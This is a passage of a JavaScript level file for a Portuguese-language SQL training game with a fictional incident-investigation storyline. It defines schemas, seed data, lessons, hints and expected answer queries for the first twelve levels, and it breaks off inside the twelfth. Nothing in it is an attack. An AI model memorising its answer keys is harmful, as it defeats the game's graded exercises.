/**
 * Operação QueryZero - Matriz de Fases e Engenharia de Desafios
 * Motor de Avaliação: SQLite 3.x (via WebAssembly / sql.js)
 *
 * Trilhas de progressão: BÁSICO -> INTERMEDIÁRIO -> AVANÇADO
 * 90 fases no total: 30 por trilha, organizadas em 6 grupos de 5 variações de conceito.
 */

const TIER_LABELS = {
    basico: "BÁSICO",
    intermediario: "INTERMEDIÁRIO",
    avancado: "AVANÇADO"
};

const LEVELS = [
{
    id: 1,
    tier: "basico",
    certModule: "SELECT & Filtro por Igualdade",
    title: "Nível 01: Mapeamento de Colaboradores",
    briefing: "Dra. Maya Vance precisa entrevistar a equipe de Engenharia antes de liberar qualquer laudo sobre o incidente. Para isso, ela pediu um levantamento rápido de quem trabalha nesse departamento dentro do sistema de RH da Aethelgard Dynamics.",
    objective: "Projete apenas as colunas 'nome' e 'cargo' da tabela 'colaboradores_rh'. Filtre somente os registros cujo 'departamento' seja igual a 'Engenharia'. Ordene o resultado por 'nome' em ordem alfabética crescente.",
    theory: {
        title: "SELECT, WHERE e ORDER BY — Os Três Pilares da Consulta",
        explanation: "Toda consulta relacional começa com três decisões: quais colunas eu quero ver (SELECT), quais linhas se qualificam (WHERE) e em que ordem elas devem aparecer (ORDER BY). O SELECT define a projeção — você nunca precisa trazer todas as colunas de uma tabela, apenas as que importam. O WHERE compara uma coluna a um valor usando o operador '=', e só as linhas onde a condição é verdadeira sobrevivem. ORDER BY, por padrão, ordena do menor para o maior (ASC); para inverter, use DESC. BOA PRÁTICA — evite SELECT *: ele traz todas as colunas, inclusive as que você não usa, e quebra consultas quando a tabela ganha colunas novas. Nas primeiras fases, liste as colunas explicitamente. Toda instrução também termina com ponto e vírgula (;).",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna1 ASC;",
        example: "-- Listar apenas o nome e o telefone de clientes do plano 'Premium'\nSELECT nome, telefone\nFROM clientes\nWHERE plano = 'Premium'\nORDER BY nome ASC;"
    },
    schemaDDL: `
        CREATE TABLE colaboradores_rh (
            colaborador_id INTEGER PRIMARY KEY,
            nome TEXT NOT NULL,
            cargo TEXT NOT NULL,
            departamento TEXT NOT NULL,
            status TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO colaboradores_rh (nome, cargo, departamento, status) VALUES
        ('Ana Beatriz Souza', 'Engenheira de Software', 'Engenharia', 'Ativo'),
        ('Bruno Carvalho', 'Analista Financeiro', 'Financeiro', 'Ativo'),
        ('Carla Mendes', 'Engenheira de Dados', 'Engenharia', 'Ativo'),
        ('Diego Martins', 'Vendedor Senior', 'Vendas', 'Ativo'),
        ('Elena Petrova', 'Gerente de RH', 'RH', 'Ativo'),
        ('Felipe Rocha', 'Engenheiro DevOps', 'Engenharia', 'Inativo'),
        ('Giovanna Lima', 'Analista de Vendas', 'Vendas', 'Ativo'),
        ('Hiroshi Tanaka', 'Engenheiro de Seguranca', 'Engenharia', 'Ativo'),
        ('Isabela Ferreira', 'Contadora', 'Financeiro', 'Ativo'),
        ('John Smith', 'Recrutador', 'RH', 'Ativo');
    `,
    expectedQuery: `
        SELECT nome, cargo
        FROM colaboradores_rh
        WHERE departamento = 'Engenharia'
        ORDER BY nome ASC, colaborador_id ASC;
    `,
    hint: "Utilize SELECT para projetar nome e cargo, WHERE departamento = 'Engenharia' para filtrar, e ORDER BY nome ASC para ordenar alfabeticamente."
},
{
    id: 2,
    tier: "basico",
    certModule: "SELECT & Filtro por Igualdade",
    title: "Nível 02: Investigação de Lançamentos Financeiros",
    briefing: "O departamento financeiro suspeita que assinaturas de software não autorizadas estejam sendo usadas como fachada para desvio de verba. Maya quer uma checagem cruzada, mas sem expor dados que não são necessários: quem consultar o relatório só precisa de descrição e valor.",
    objective: "Compare o SELECT * com a consulta de colunas explícitas. O SELECT * traz todas as 4 colunas da tabela 'lancamentos_financeiros', e nesta fase ele não é aceito. Escreva a consulta que projeta apenas 'descricao' e 'valor', filtra 'categoria' igual a 'Assinatura de Software' e ordena por 'descricao' em ordem alfabética crescente.",
    theory: {
        title: "SELECT, WHERE e ORDER BY — Os Três Pilares da Consulta",
        explanation: "Toda consulta relacional começa com três decisões: quais colunas eu quero ver (SELECT), quais linhas se qualificam (WHERE) e em que ordem elas devem aparecer (ORDER BY). O SELECT define a projeção — você nunca precisa trazer todas as colunas de uma tabela, apenas as que importam. O WHERE compara uma coluna a um valor usando o operador '=', e só as linhas onde a condição é verdadeira sobrevivem. ORDER BY, por padrão, ordena do menor para o maior (ASC); para inverter, use DESC. BOA PRÁTICA — evite SELECT *: ele traz todas as colunas, inclusive as que você não usa, e quebra consultas quando a tabela ganha colunas novas. Nas primeiras fases, liste as colunas explicitamente. Toda instrução também termina com ponto e vírgula (;).",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna1 ASC;",
        example: "-- SELECT *: traz todas as colunas, inclusive as que o relatório não precisa\nSELECT *\nFROM lancamentos_financeiros;\n\n-- Colunas explícitas: só o que a checagem exige\nSELECT descricao, valor\nFROM lancamentos_financeiros\nWHERE categoria = 'Assinatura de Software'\nORDER BY descricao ASC;"
    },
    schemaDDL: `
        CREATE TABLE lancamentos_financeiros (
            lancamento_id INTEGER PRIMARY KEY,
            descricao TEXT NOT NULL,
            categoria TEXT NOT NULL,
            valor REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO lancamentos_financeiros (descricao, categoria, valor) VALUES
        ('Licenca Adobe Creative Cloud', 'Assinatura de Software', 899.90),
        ('Aluguel de Escritorio Central', 'Infraestrutura', 15000.00),
        ('Licenca Microsoft 365', 'Assinatura de Software', 1200.00),
        ('Compra de Notebooks Dell', 'Equipamento', 32000.00),
        ('Assinatura AWS Enterprise Support', 'Assinatura de Software', 5400.00),
        ('Manutencao de Ar Condicionado', 'Infraestrutura', 2200.00),
        ('Licenca Slack Business Plus', 'Assinatura de Software', 780.50),
        ('Servico de Limpeza Mensal', 'Servicos Gerais', 1800.00),
        ('Consultoria Juridica Trimestral', 'Servicos Gerais', 9500.00);
    `,
    expectedQuery: `
        SELECT descricao, valor
        FROM lancamentos_financeiros
        WHERE categoria = 'Assinatura de Software'
        ORDER BY descricao ASC, lancamento_id ASC;
    `,
    hint: "Utilize SELECT para projetar descricao e valor, WHERE categoria = 'Assinatura de Software' para filtrar, e ORDER BY descricao ASC para ordenar alfabeticamente."
},
{
    id: 3,
    tier: "basico",
    certModule: "SELECT & Filtro por Igualdade",
    title: "Nível 03: Rastreamento de Remessas Atrasadas",
    briefing: "Um fornecedor alega que um equipamento forense crítico nunca chegou ao laboratório. Maya precisa que você consulte o sistema de logística e liste apenas as remessas marcadas como atrasadas para investigar o paradeiro da carga.",
    objective: "Projete apenas as colunas 'codigo_rastreio' e 'destino' da tabela 'remessas_logistica'. Filtre somente os registros cujo 'status_entrega' seja igual a 'Atrasado'. Ordene o resultado por 'codigo_rastreio' em ordem alfabética crescente.",
    theory: {
        title: "SELECT, WHERE e ORDER BY — Os Três Pilares da Consulta",
        explanation: "Toda consulta relacional começa com três decisões: quais colunas eu quero ver (SELECT), quais linhas se qualificam (WHERE) e em que ordem elas devem aparecer (ORDER BY). O SELECT define a projeção — você nunca precisa trazer todas as colunas de uma tabela, apenas as que importam. O WHERE compara uma coluna a um valor usando o operador '=', e só as linhas onde a condição é verdadeira sobrevivem. ORDER BY, por padrão, ordena do menor para o maior (ASC); para inverter, use DESC. BOA PRÁTICA — evite SELECT *: ele traz todas as colunas, inclusive as que você não usa, e quebra consultas quando a tabela ganha colunas novas. Nas primeiras fases, liste as colunas explicitamente. Toda instrução também termina com ponto e vírgula (;).",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna1 ASC;",
        example: "-- Listar apenas o codigo e a sala de reservas com status 'Cancelada'\nSELECT codigo_reserva, sala\nFROM reservas\nWHERE status = 'Cancelada'\nORDER BY codigo_reserva ASC;"
    },
    schemaDDL: `
        CREATE TABLE remessas_logistica (
            remessa_id INTEGER PRIMARY KEY,
            codigo_rastreio TEXT NOT NULL,
            destino TEXT NOT NULL,
            status_entrega TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO remessas_logistica (codigo_rastreio, destino, status_entrega) VALUES
        ('BR-1001', 'Sao Paulo', 'Entregue'),
        ('BR-1002', 'Rio de Janeiro', 'Atrasado'),
        ('BR-1003', 'Curitiba', 'Em Transito'),
        ('BR-1004', 'Belo Horizonte', 'Atrasado'),
        ('BR-1005', 'Porto Alegre', 'Entregue'),
        ('BR-1006', 'Salvador', 'Atrasado'),
        ('BR-1007', 'Recife', 'Em Transito'),
        ('BR-1008', 'Fortaleza', 'Entregue'),
        ('BR-1009', 'Manaus', 'Atrasado'),
        ('BR-1010', 'Brasilia', 'Em Transito');
    `,
    expectedQuery: `
        SELECT codigo_rastreio, destino
        FROM remessas_logistica
        WHERE status_entrega = 'Atrasado'
        ORDER BY codigo_rastreio ASC, remessa_id ASC;
    `,
    hint: "Utilize SELECT para projetar codigo_rastreio e destino, WHERE status_entrega = 'Atrasado' para filtrar, e ORDER BY codigo_rastreio ASC para ordenar."
},
{
    id: 4,
    tier: "basico",
    certModule: "SELECT & Filtro por Igualdade",
    title: "Nível 04: Pedidos da Região Sul",
    briefing: "O time de vendas relatou um pico incomum de pedidos vindos da regiao Sul na mesma janela de tempo do incidente. Maya suspeita de uma conexão e pediu que você isole exatamente esses pedidos para análise.",
    objective: "Projete apenas as colunas 'cliente' e 'produto' da tabela 'pedidos_vendas'. Filtre somente os registros cuja 'regiao' seja igual a 'Sul'. Ordene o resultado por 'cliente' em ordem alfabética crescente.",
    theory: {
        title: "SELECT, WHERE e ORDER BY — Os Três Pilares da Consulta",
        explanation: "Toda consulta relacional começa com três decisões: quais colunas eu quero ver (SELECT), quais linhas se qualificam (WHERE) e em que ordem elas devem aparecer (ORDER BY). O SELECT define a projeção — você nunca precisa trazer todas as colunas de uma tabela, apenas as que importam. O WHERE compara uma coluna a um valor usando o operador '=', e só as linhas onde a condição é verdadeira sobrevivem. ORDER BY, por padrão, ordena do menor para o maior (ASC); para inverter, use DESC. BOA PRÁTICA — evite SELECT *: ele traz todas as colunas, inclusive as que você não usa, e quebra consultas quando a tabela ganha colunas novas. Nas primeiras fases, liste as colunas explicitamente. Toda instrução também termina com ponto e vírgula (;).",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x = 'valor'\nORDER BY coluna1 ASC;",
        example: "-- REVISÃO: antes de alterar dados, confira com SELECT quais linhas o WHERE atinge\nSELECT cliente, produto\nFROM pedidos_vendas\nWHERE regiao = 'Sul'\nORDER BY cliente ASC;\n\n-- Só depois aplique a mesma condição no UPDATE (fase 5)\nUPDATE pedidos_vendas\nSET regiao = 'Sul-Revisao'\nWHERE regiao = 'Sul';"
    },
    schemaDDL: `
        CREATE TABLE pedidos_vendas (
            pedido_id INTEGER PRIMARY KEY,
            cliente TEXT NOT NULL,
            produto TEXT NOT NULL,
            regiao TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO pedidos_vendas (cliente, produto, regiao) VALUES
        ('Mercado Bom Preco', 'Notebook Ultra X1', 'Sul'),
        ('Farmacia Vida Plena', 'Monitor 27 Polegadas', 'Sudeste'),
        ('Auto Pecas Rapidas', 'Teclado Mecanico', 'Sul'),
        ('Padaria Trigo Dourado', 'Mouse sem Fio', 'Nordeste'),
        ('Livraria Pagina Feliz', 'Cadeira Ergonomica', 'Sul'),
        ('Restaurante Sabor Real', 'Impressora Laser', 'Centro-Oeste'),
        ('Oficina Motor Forte', 'Headset Gamer', 'Sudeste'),
        ('Loja Estilo Urbano', 'Notebook Ultra X1', 'Sul'),
        ('Papelaria Criativa', 'Webcam HD', 'Norte'),
        ('Supermercado Familia', 'Monitor 27 Polegadas', 'Nordeste');
    `,
    expectedQuery: `
        SELECT cliente, produto
        FROM pedidos_vendas
        WHERE regiao = 'Sul'
        ORDER BY cliente ASC, pedido_id ASC;
    `,
    hint: "Utilize SELECT para projetar cliente e produto, WHERE regiao = 'Sul' para filtrar, e ORDER BY cliente ASC para ordenar."
},
{
    id: 5,
    tier: "basico",
    certModule: "SELECT & Filtro por Igualdade",
    title: "Nível 05: Isolamento de Serviço Comprometido",
    briefing: "Maya identificou o serviço de autenticação sob ataque e um ambiente de teste exposto na mesma rede. Antes do relatório final, ela quer que você altere o cadastro de infraestrutura: isole o serviço comprometido e remova o ambiente de teste. Nenhuma outra linha pode ser afetada.",
    objective: "Execute duas instruções na ordem: (1) UPDATE em 'servicos_infra' trocando 'status' para 'Isolado' somente no serviço 'auth-service'; (2) DELETE em 'servicos_infra' removendo somente o serviço 'test-runner'. Cada UPDATE e cada DELETE precisa de WHERE, e cada instrução termina com ';'.",
    theory: {
        title: "UPDATE e DELETE — Alterar e Remover Dados com Segurança",
        explanation: "Até aqui você só leu dados. UPDATE altera linhas existentes: UPDATE tabela SET coluna = valor WHERE condicao. DELETE remove linhas: DELETE FROM tabela WHERE condicao. A cláusula WHERE é o que separa uma alteração cirúrgica de um desastre: sem ela, a instrução vale para TODAS as linhas da tabela. Por isso, este ambiente bloqueia UPDATE e DELETE sem WHERE. Antes de executar uma alteração real em produção, faça o SELECT com o mesmo WHERE para conferir quais linhas serão afetadas.",
        syntax: "UPDATE tabela\nSET coluna = 'novo_valor'\nWHERE coluna_x = 'valor';\n\nDELETE FROM tabela\nWHERE coluna_x = 'valor';",
        example: "-- Confira primeiro quais linhas serão afetadas\nSELECT servico_id, nome_servico\nFROM servicos_infra\nWHERE nome_servico = 'auth-service';\n\n-- Depois aplique a alteração com o mesmo WHERE\nUPDATE servicos_infra\nSET status = 'Isolado'\nWHERE nome_servico = 'auth-service';"
    },
    schemaDDL: `
        CREATE TABLE servicos_infra (
            servico_id INTEGER PRIMARY KEY,
            nome_servico TEXT NOT NULL,
            ambiente TEXT NOT NULL,
            status TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO servicos_infra (nome_servico, ambiente, status) VALUES
        ('api-gateway', 'Producao', 'Operacional'),
        ('api-gateway-staging', 'Staging', 'Operacional'),
        ('auth-service', 'Producao', 'Degradado'),
        ('billing-worker', 'Producao', 'Operacional'),
        ('cache-redis-dev', 'Desenvolvimento', 'Operacional'),
        ('notification-service', 'Producao', 'Offline'),
        ('report-generator', 'Staging', 'Operacional'),
        ('search-indexer', 'Producao', 'Operacional'),
        ('test-runner', 'Desenvolvimento', 'Offline'),
        ('user-profile-service', 'Homologacao', 'Operacional');
    `,
    mode: "dml",
    expectedDml: `
        UPDATE servicos_infra SET status = 'Isolado' WHERE nome_servico = 'auth-service';
        DELETE FROM servicos_infra WHERE nome_servico = 'test-runner';
    `,
    checkQuery: `
        SELECT servico_id, nome_servico, ambiente, status
        FROM servicos_infra
        ORDER BY servico_id ASC;
    `,
    hint: "Use UPDATE servicos_infra SET status = 'Isolado' WHERE nome_servico = 'auth-service'; e depois DELETE FROM servicos_infra WHERE nome_servico = 'test-runner';. Não esqueça o WHERE nem o ponto e vírgula."
},
{
    id: 6,
    tier: "basico",
    certModule: "Filtros Numéricos & Comparação",
    title: "Nível 06: Pontos de Acesso Comprometidos",
    briefing: "O sistema de controle de acesso físico registrou dezenas de tentativas de entrada falhas na noite do incidente. Maya quer isolar apenas os funcionários com um número alto de falhas para identificar possíveis tentativas de invasão física.",
    objective: "Projete apenas as colunas 'funcionario' e 'tentativas_falhas' da tabela 'controle_acesso_fisico'. Filtre somente os registros em que 'tentativas_falhas' seja maior que 3. Ordene o resultado por 'tentativas_falhas' em ordem decrescente.",
    theory: {
        title: "Operadores de Comparação Numérica",
        explanation: "Além da igualdade (=), o WHERE aceita operadores de comparação numérica: '>', '<', '>=', '<=' e '<>' (ou '!=') para diferença. Eles funcionam com números, datas e até texto. Quando você quer ver primeiro os valores mais altos, use ORDER BY coluna DESC; para ver os menores primeiro, use ASC.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica > valor\nORDER BY coluna_numerica DESC;",
        example: "-- Listar clientes com mais de 5 reclamacoes registradas\nSELECT cliente, total_reclamacoes\nFROM atendimentos\nWHERE total_reclamacoes > 5\nORDER BY total_reclamacoes DESC;"
    },
    schemaDDL: `
        CREATE TABLE controle_acesso_fisico (
            acesso_id INTEGER PRIMARY KEY,
            funcionario TEXT NOT NULL,
            ponto_acesso TEXT NOT NULL,
            tentativas_falhas INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO controle_acesso_fisico (funcionario, ponto_acesso, tentativas_falhas) VALUES
        ('Marcos Vieira', 'Porta Principal', 1),
        ('Renata Alves', 'Sala de Servidores', 5),
        ('Thiago Nunes', 'Porta Principal', 2),
        ('Patricia Gomes', 'Sala de Servidores', 7),
        ('Lucas Barbosa', 'Deposito', 4),
        ('Camila Rodrigues', 'Porta Principal', 0),
        ('Eduardo Lima', 'Sala de Servidores', 6),
        ('Fernanda Costa', 'Deposito', 3),
        ('Gustavo Pires', 'Porta Principal', 9),
        ('Helena Duarte', 'Sala de Servidores', 4);
    `,
    expectedQuery: `
        SELECT funcionario, tentativas_falhas
        FROM controle_acesso_fisico
        WHERE tentativas_falhas > 3
        ORDER BY tentativas_falhas DESC, acesso_id ASC;
    `,
    hint: "Use WHERE tentativas_falhas > 3 combinado com ORDER BY tentativas_falhas DESC."
},
{
    id: 7,
    tier: "basico",
    certModule: "Filtros Numéricos & Comparação",
    title: "Nível 07: Sensores de Temperatura Críticos",
    briefing: "Um superaquecimento no datacenter pode ter sido usado como cortina de fumaça para o ataque. Maya precisa saber quais sensores registraram temperaturas anormalmente altas para cruzar os horários com o restante da investigação.",
    objective: "Projete apenas as colunas 'sensor_nome' e 'temperatura_celsius' da tabela 'leituras_sensores'. Filtre somente os registros em que 'temperatura_celsius' seja maior ou igual a 75. Ordene o resultado por 'temperatura_celsius' em ordem crescente.",
    theory: {
        title: "Operadores de Comparação Numérica",
        explanation: "Além da igualdade (=), o WHERE aceita operadores de comparação numérica: '>', '<', '>=', '<=' e '<>' (ou '!=') para diferença. Eles funcionam com números, datas e até texto. Quando você quer ver primeiro os valores mais altos, use ORDER BY coluna DESC; para ver os menores primeiro, use ASC.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica >= valor\nORDER BY coluna_numerica ASC;",
        example: "-- Listar produtos com estoque critico (10 unidades ou menos)\nSELECT produto, estoque\nFROM inventario\nWHERE estoque <= 10\nORDER BY estoque ASC;"
    },
    schemaDDL: `
        CREATE TABLE leituras_sensores (
            leitura_id INTEGER PRIMARY KEY,
            sensor_nome TEXT NOT NULL,
            temperatura_celsius REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO leituras_sensores (sensor_nome, temperatura_celsius) VALUES
        ('Sala-Servidores-A', 68.5),
        ('Sala-Servidores-B', 82.3),
        ('Rack-Storage-01', 75.0),
        ('Rack-Storage-02', 91.7),
        ('Sala-Refrigeracao', 45.2),
        ('Rack-Network-01', 79.9),
        ('Rack-Storage-03', 60.0),
        ('Sala-Servidores-C', 88.1),
        ('Rack-Network-02', 74.9);
    `,
    expectedQuery: `
        SELECT sensor_nome, temperatura_celsius
        FROM leituras_sensores
        WHERE temperatura_celsius >= 75
        ORDER BY temperatura_celsius ASC, leitura_id ASC;
    `,
    hint: "Use WHERE temperatura_celsius >= 75 combinado com ORDER BY temperatura_celsius ASC."
},
{
    id: 8,
    tier: "basico",
    certModule: "Filtros Numéricos & Comparação",
    title: "Nível 08: Tickets com Resposta Lenta",
    briefing: "Clientes reclamaram que o suporte demorou horas para reagir durante a janela do ataque — o que pode ter atrasado a detecção. Maya quer a lista dos chamados com tempo de resposta acima do normal.",
    objective: "Projete apenas as colunas 'assunto' e 'tempo_resposta_horas' da tabela 'tickets_suporte'. Filtre somente os registros em que 'tempo_resposta_horas' seja maior que 24. Ordene o resultado por 'tempo_resposta_horas' em ordem decrescente.",
    theory: {
        title: "Operadores de Comparação Numérica",
        explanation: "Além da igualdade (=), o WHERE aceita operadores de comparação numérica: '>', '<', '>=', '<=' e '<>' (ou '!=') para diferença. Eles funcionam com números, datas e até texto. Quando você quer ver primeiro os valores mais altos, use ORDER BY coluna DESC; para ver os menores primeiro, use ASC.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica > valor\nORDER BY coluna_numerica DESC;",
        example: "-- Listar voos com atraso maior que 60 minutos\nSELECT voo, atraso_minutos\nFROM voos\nWHERE atraso_minutos > 60\nORDER BY atraso_minutos DESC;"
    },
    schemaDDL: `
        CREATE TABLE tickets_suporte (
            ticket_id INTEGER PRIMARY KEY,
            assunto TEXT NOT NULL,
            tempo_resposta_horas REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO tickets_suporte (assunto, tempo_resposta_horas) VALUES
        ('Login nao funciona', 3.5),
        ('Erro ao exportar relatorio', 30.2),
        ('Duvida sobre fatura', 12.0),
        ('Sistema fora do ar', 48.9),
        ('Solicitacao de reembolso', 26.7),
        ('Problema de sincronizacao', 5.1),
        ('API retornando erro 500', 72.4),
        ('Alteracao de cadastro', 8.3),
        ('Falha na integracao de pagamento', 40.0),
        ('Duvida sobre planos', 2.0);
    `,
    expectedQuery: `
        SELECT assunto, tempo_resposta_horas
        FROM tickets_suporte
        WHERE tempo_resposta_horas > 24
        ORDER BY tempo_resposta_horas DESC, ticket_id ASC;
    `,
    hint: "Use WHERE tempo_resposta_horas > 24 combinado com ORDER BY tempo_resposta_horas DESC."
},
{
    id: 9,
    tier: "basico",
    certModule: "Filtros Numéricos & Comparação",
    title: "Nível 09: Áreas Reprovadas na Inspeção de Segurança",
    briefing: "O time de segurança fez uma inspeção semanas antes do incidente. Maya suspeita que uma área com pontuação de segurança muito baixa possa ter sido a porta de entrada dos atacantes.",
    objective: "Projete apenas as colunas 'area_inspecionada' e 'pontuacao_seguranca' da tabela 'inspecoes_seguranca'. Filtre somente os registros em que 'pontuacao_seguranca' seja menor que 70. Ordene o resultado por 'pontuacao_seguranca' em ordem crescente.",
    theory: {
        title: "Operadores de Comparação Numérica",
        explanation: "Além da igualdade (=), o WHERE aceita operadores de comparação numérica: '>', '<', '>=', '<=' e '<>' (ou '!=') para diferença. Eles funcionam com números, datas e até texto. Quando você quer ver primeiro os valores mais altos, use ORDER BY coluna DESC; para ver os menores primeiro, use ASC.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica < valor\nORDER BY coluna_numerica ASC;",
        example: "-- Listar alunos com media final abaixo de 6\nSELECT aluno, media_final\nFROM boletins\nWHERE media_final < 6\nORDER BY media_final ASC;"
    },
    schemaDDL: `
        CREATE TABLE inspecoes_seguranca (
            inspecao_id INTEGER PRIMARY KEY,
            area_inspecionada TEXT NOT NULL,
            pontuacao_seguranca INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO inspecoes_seguranca (area_inspecionada, pontuacao_seguranca) VALUES
        ('Gestao de Acessos', 55),
        ('Politica de Senhas', 88),
        ('Backup e Recuperacao', 62),
        ('Criptografia de Dados', 91),
        ('Treinamento de Funcionarios', 40),
        ('Monitoramento de Rede', 76),
        ('Gestao de Fornecedores', 68),
        ('Resposta a Incidentes', 95),
        ('Controle de Mudancas', 30);
    `,
    expectedQuery: `
        SELECT area_inspecionada, pontuacao_seguranca
        FROM inspecoes_seguranca
        WHERE pontuacao_seguranca < 70
        ORDER BY pontuacao_seguranca ASC, inspecao_id ASC;
    `,
    hint: "Use WHERE pontuacao_seguranca < 70 combinado com ORDER BY pontuacao_seguranca ASC."
},
{
    id: 10,
    tier: "basico",
    certModule: "Filtros Numéricos & Comparação",
    title: "Nível 10: Transações Fora do Padrão",
    briefing: "O sistema antifraude classifica cada transação com um nível de risco de 1 a 5. Maya quer descartar apenas as transações de risco mínimo e focar em tudo que fugiu do padrão de normalidade.",
    objective: "Projete apenas as colunas 'conta_origem' e 'nivel_risco' da tabela 'transacoes_suspeitas'. Filtre somente os registros em que 'nivel_risco' seja diferente de 1. Ordene o resultado por 'nivel_risco' em ordem decrescente.",
    theory: {
        title: "Operadores de Comparação Numérica",
        explanation: "Além da igualdade (=), o WHERE aceita operadores de comparação numérica: '>', '<', '>=', '<=' e '<>' (ou '!=') para diferença. Eles funcionam com números, datas e até texto. Quando você quer ver primeiro os valores mais altos, use ORDER BY coluna DESC; para ver os menores primeiro, use ASC.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica <> valor\nORDER BY coluna_numerica DESC;",
        example: "-- Listar pedidos cujo status seja diferente de 'Cancelado' (codigo 0)\nSELECT pedido_id, status_codigo\nFROM pedidos\nWHERE status_codigo <> 0\nORDER BY status_codigo DESC;"
    },
    schemaDDL: `
        CREATE TABLE transacoes_suspeitas (
            transacao_id INTEGER PRIMARY KEY,
            conta_origem TEXT NOT NULL,
            nivel_risco INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO transacoes_suspeitas (conta_origem, nivel_risco) VALUES
        ('CTA-4471', 1),
        ('CTA-8823', 4),
        ('CTA-1092', 1),
        ('CTA-6650', 3),
        ('CTA-2214', 5),
        ('CTA-9987', 1),
        ('CTA-3345', 2),
        ('CTA-7781', 5),
        ('CTA-5566', 1),
        ('CTA-8899', 4);
    `,
    expectedQuery: `
        SELECT conta_origem, nivel_risco
        FROM transacoes_suspeitas
        WHERE nivel_risco <> 1
        ORDER BY nivel_risco DESC, transacao_id ASC;
    `,
    hint: "Use WHERE nivel_risco <> 1 combinado com ORDER BY nivel_risco DESC."
},
{
    id: 11,
    tier: "basico",
    certModule: "LIKE — Padrões de Texto",
    title: "Nível 11: Processos Iniciados por Powershell",
    briefing: "Atacantes costumam abusar do Powershell para executar scripts maliciosos sem levantar suspeitas óbvias. Maya pediu uma varredura nos processos monitorados para encontrar tudo que começa com esse nome.",
    objective: "Projete apenas as colunas 'nome_processo' e 'host_origem' da tabela 'processos_monitorados'. Filtre somente os registros em que 'nome_processo' comece com 'powershell' (utilize LIKE 'powershell%'). Ordene o resultado por 'nome_processo' em ordem alfabética crescente.",
    theory: {
        title: "LIKE e Curingas de Texto",
        explanation: "O operador LIKE permite buscar textos que seguem um padrão, em vez de uma igualdade exata. O símbolo '%' representa qualquer sequência de caracteres (inclusive vazia). Colocar o '%' no final do padrão ('valor%') busca textos que começam com aquele valor; no início ('%valor') busca textos que terminam com ele; e nos dois lados ('%valor%') busca textos que contêm aquele valor em qualquer posição.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE 'prefixo%'\nORDER BY coluna1 ASC;",
        example: "-- Listar arquivos cujo nome comeca com 'backup'\nSELECT nome_arquivo, tamanho_mb\nFROM arquivos\nWHERE nome_arquivo LIKE 'backup%'\nORDER BY nome_arquivo ASC;"
    },
    schemaDDL: `
        CREATE TABLE processos_monitorados (
            processo_id INTEGER PRIMARY KEY,
            nome_processo TEXT NOT NULL,
            host_origem TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO processos_monitorados (nome_processo, host_origem) VALUES
        ('powershell.exe', 'WKS-021'),
        ('powershell_ise.exe', 'WKS-014'),
        ('notepad.exe', 'WKS-009'),
        ('cmd.exe', 'WKS-021'),
        ('powershell-core.exe', 'SRV-DB01'),
        ('chrome.exe', 'WKS-014'),
        ('explorer.exe', 'WKS-009'),
        ('winword.exe', 'WKS-030'),
        ('svchost.exe', 'SRV-DB01'),
        ('taskmgr.exe', 'WKS-021');
    `,
    expectedQuery: `
        SELECT nome_processo, host_origem
        FROM processos_monitorados
        WHERE nome_processo LIKE 'powershell%'
        ORDER BY nome_processo ASC, processo_id ASC;
    `,
    hint: "Use WHERE nome_processo LIKE 'powershell%' combinado com ORDER BY nome_processo ASC."
},
{
    id: 12,
    tier: "basico",
    certModule: "LIKE — Padrões de Texto",
    title: "Nível 12: Currículos com Extensão Suspeita",
    briefing: "O time de RH recebeu anexos de candidatura que podem esconder executáveis maliciosos disfarçados de currículo. Maya quer que você encontre todos os arquivos que terminam com a extensão '.exe'.",
    objective: "Projete apenas as colunas 'nome_arquivo' e 'candidato' da tabela 'anexos_recrutamento'. Filtre somente os registros em que 'nome_arquivo' termine com '.exe' (utilize LIKE '%.exe'). Ordene o resultado por 'nome_arquivo' em ordem alfabética crescente.",
    theory: {
        title: "LIKE e Curingas de Texto",
        explanation: "O operador LIKE permite buscar textos que seguem um padrão, em vez de uma igualdade exata. O símbolo '%' representa qualquer sequência de caracteres (inclusive vazia). Colocar o '%' no final do padrão ('valor%') busca textos que começam com aquele valor; no início ('%valor') busca textos que terminam com ele; e nos dois lados ('%valor%') busca textos que contêm aquele valor em qualquer posição.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE '%sufixo'\nORDER BY coluna1 ASC;",
        example: "-- Listar imagens cujo nome termina com '.png'\nSELECT nome_arquivo, autor\nFROM galeria\nWHERE nome_arquivo LIKE '%.png'\nORDER BY nome_arquivo ASC;"
    },
    schemaDDL: `
        CREATE TABLE anexos_recrutamento (
            anexo_id INTEGER PRIMARY KEY,
            nome_arquivo TEXT NOT NULL,
            candidato TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO anexos_recrutamento (nome_arquivo, candidato) VALUES
        ('curriculo_joao.pdf', 'Joao Pereira'),
        ('portfolio_maria.docx', 'Maria Santos'),
        ('curriculo_falso.exe', 'Anonimo'),
        ('carta_apresentacao.pdf', 'Carlos Silva'),
        ('instalador_update.exe', 'Anonimo'),
        ('certificados.zip', 'Ana Paula'),
        ('curriculo_pedro.doc', 'Pedro Alves'),
        ('ferramenta_rh.exe', 'Anonimo'),
